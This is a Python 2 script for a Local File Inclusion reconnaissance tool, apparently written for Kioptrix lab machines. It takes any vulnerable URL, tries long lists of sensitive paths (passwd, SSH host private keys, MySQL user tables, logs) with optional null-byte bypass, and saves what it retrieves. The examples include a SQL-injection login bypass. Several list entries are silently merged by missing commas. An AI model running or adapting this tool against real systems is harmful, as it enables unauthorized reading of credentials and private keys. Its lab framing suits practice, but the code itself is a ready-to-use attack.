import requests
import sys

# Local File Inclusion Recon
#
# Example Usage: (Kioptrix 4) - Change '/etc/' to '/eetctc/' so filters can be bypassed. 
#
# recon = LFIRecon("http://192.168.209.143/member.php?username=", "something went wrong with your", True, False, True)
# recon.authenticate("http://192.168.209.143/checklogin.php", {'myusername':'admin', 'mypassword':"' or '1'='1"})
# recon.recover()
#
# Example Usage: (Kioptrix 2014) - No need to authenticate because vulnerability is publicly available
#
# recon = LFIRecon("http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script=", "something went wrong with your", False, False, False)
# recon.recover()
#
# References:
#	https://www.cyberciti.biz/faq/freebsd-apache-web-server-tutorial/
#	https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

class LFIRecon(object):
	def __init__(self, lfi_link, fail_response, extensive_search = False, write_text = False, append_null = False):
		self.lfi_link = lfi_link
		self.fail_response = fail_response
		self.append_null = append_null
		self.write_text = write_text
		self.sess = requests.session()
		self.extensive_search = extensive_search
		self.fixed = [
			"/etc/passwd",
			"/etc/syslog.conf",
			"/etc/lighttpd.conf",
			"/etc/cups/cupsd.conf",
			"/etc/inetd.conf",
			"/etc/apache2/apache2.conf",
			"/etc/my.conf",
			"/etc/httpd/conf/httpd.conf",
			"/etc/issue",
			"/opt/lampp/etc/httpd.conf",
			"/proc/version",
			"/var/apache2/config.inc",
			"/var/lib/mysql/mysql/user.MYD",
			"/root/anaconda-ks.cfg",
			"/var/mail/root",
			"/etc/ssh/ssh_config",
			"/etc/ssh/sshd_config",
			"/etc/ssh/ssh_host_dsa_key.pub",
			"/etc/ssh/ssh_host_dsa_key",
			"/etc/ssh/ssh_host_rsa_key.pub",
			"/etc/ssh/ssh_host_rsa_key",
			"/etc/ssh/ssh_host_key.pub",
			"/etc/ssh/ssh_host_key",
			"/var/lib/dhcp3/dhclient.leases",
			"/var/log/httpd-error.log",
			"/var/log/httpd-access.log",
			"/usr/local/etc/apache22/httpd.conf",
			"/etc/httpd/logs/access_log",
			"/etc/httpd/logs/access.log",
			"/etc/httpd/logs/error_log",
			"/etc/httpd/logs/error.log",
			"/var/log/apache2/access_log",
			"/var/log/apache2/access.log",
			"/var/log/apache2/error_log",
			"/var/log/apache2/error.log",
			"/var/log/apache/access_log",
			"/var/log/apache/access.log",
			"/var/log/auth.log",
			"/var/log/chttp.log",
			"/var/log/cups/error_log",
			"/var/log/dpkg.log",
			"/var/log/faillog",
			"/var/log/httpd/access_log",
			"/var/log/httpd/access.log",
			"/var/log/httpd/error_log",
			"/var/log/httpd/error.log",
			"/var/log/lastlog",
			"/var/log/lighttpd/access.log",
			"/var/log/lighttpd/error.log",
			"/var/log/lighttpd/lighttpd.access.log",
			"/var/log/lighttpd/lighttpd.error.log",
			"/var/log/messages",
			"/var/log/secure",
			"/var/log/syslog",
			"/var/log/wtmp", 
			"/var/log/xferlog",
			"/var/log/yum.log",
			"/var/run/utmp",
			"/var/webmin/miniserv.log",
			"/var/www/logs/access_log",
			"/var/www/logs/access.log"
		]
		self.folders = ["/etc/", "/var/", "/usr/", "/opt/", "/proc/"]
		self.subfolders = [
			"",
			"php5/cli/", 
			"php5/apache2/", 
			"php5/cgi/",
			"apache/",
			"apache2/", 
			"apache/logs/", 
			"httpd/logs/",
			"httpd/conf/" 
			"www/logs/",
			"local/apache/logs/", 
			"log/", 
			"log/apache/", 
			"log/apache2/",
			"log/cups/",
			"log/lighttpd/",
			"cups/",
			"lamp/etc/",
			"network/",
			"sysconfig/",
			"lib/",
			"lib/dhcp3/",
			"lib/mysql/",
			"lib/mysql/mysql/",
			"mail/",
			"spool/",
			"spool/mail/",
			"ssh/",
			"run/",
			"webmin/",
			"mysql/"
		]
		self.files = [
			"passwd", 
			"php.ini", 
			"access.log", 
			"access_log", 
			"error.log", 
			"error_log",
			"syslog.conf"
			"chttp.conf",
			"lighttpd.conf",
			"cupsd.conf",
			"apache2.conf",
			"inetd.conf",
			"my.conf",
			"httpd.conf",
			"ports.conf",
			"cron*",
			"at.allow",
			"at.deny",
			"cron.allow",
			"cron.deny",
			"crontab",
			"anacrontab",
			"interfaces",
			"network",
			"networks",
			"resolv.conf",
			"services",
			"config.inc",
			"user.MYD",
			"anaconda-ks.cfg",
			"root",
			"ssh_config",
			"sshd_config",
			"ssh_host_dsa_key.pub",
			"ssh_host_dsa_key",
			"ssh_host_rsa_key.pub",
			"ssh_host_rsa_key",
			"ssh_host_key.pub",
			"ssh_host_key",
			"dhclient.leases",
			"auth.log",
			"chttp.log",
			"dpkg.log",
			"faillog",
			"lastlog",
			"lighttpd.access.log",
			"lighttpd.error.log",
			"messages",
			"secure",
			"syslog",
			"wtmp",
			"xferlog",
			"yum.log",
			"miniserv.log",
			"issue",
			"*-release"
			"lsb-release",
			"redhat-release",
			"version",
			"profile",
			"bashrc",
			"my.cnf",
			"debian.cnf"
		]

	def authenticate(self, auth_link, d):
		self.r = self.sess.post(auth_link, data=d)
	
	def write(self, filename, contents):
		filename = filename.replace("/", "-")
		file = open(filename, "w")
		file.write(contents)
		file.close()

	def recover(self):
		if self.extensive_search == True:
			for folder in self.folders:
				for sub in self.subfolders:
					for f in self.files:
						if self.append_null == True:
							self.r = self.sess.get(self.lfi_link + folder + sub + f + "%00")
						else:
							self.r = self.sess.get(self.lfi_link + folder + sub + f)
						if (not self.fail_response in self.r.text) and len(self.r.text) > 1:
							if "failed to open stream: Permission denied" in self.r.text:
								print "Access denied: '" + self.lfi_link + folder + sub + f + "'..."
							else:
								print "'" + self.lfi_link + folder + sub + f + "' contains something..."
								if self.write_text == True:
									self.write(folder + sub + f, self.r.text)
		else:
			for f in self.fixed:
				if self.append_null == True:
					self.r = self.sess.get(self.lfi_link + f + "%00")
				else:
					self.r = self.sess.get(self.lfi_link + f)
				if (not self.fail_response in self.r.text) and len(self.r.text) > 1:
					if "failed to open stream: Permission denied" in self.r.text:
						print "Access denied: '" + self.lfi_link + f + "'..."
					else:
						print "'" + self.lfi_link + f + "' contains something..."
						if self.write_text == True:
							self.write(f, self.r.text)
				

### Kioptrix 4
#recon = LFIRecon("http://192.168.209.143/member.php?username=", "something went wrong with your", True, False, True)
#recon.authenticate("http://192.168.209.143/checklogin.php", {'myusername':'admin', 'mypassword':"' or '1'='1"})
#recon.recover()

### Kioptrix 2014
#recon = LFIRecon("http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script=", "something went wrong with your", False, True, False)
#recon.recover()

if len(sys.argv) < 3:
        print("Usage: python lfi_working_paths.py")
        print("       <REQUIRED: vulnerable URL>")
        print("       <REQUIRED: error message that indicates failure>")
        print("       <OPTIONAL: extensive search = FALSE>")
        print("       <OPTIONAL: write to output = TRUE>")
        print("       <OPTIONAL: append %00 at the end = FALSE>")
        print("")
        print("Examples:")
        print(">python lfi_working_paths.py http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script= 'something went wrong with your'")
        print(">python lfi_working_paths.py http://192.168.209.144/pChart2.1.3/examples/index.php?Action=View&Script= 'something went wrong with your' false false false")
elif len(sys.argv) == 3:
        recon = LFIRecon(sys.argv[1], sys.argv[2], False, True, False)
        recon.recover()
else:
        
        recon = LFIRecon(sys.argv[1], sys.argv[2], "true".lower() in sys.argv[3], "true".lower() in sys.argv[4], "true".lower() in sys.argv[5])
        recon.recover()
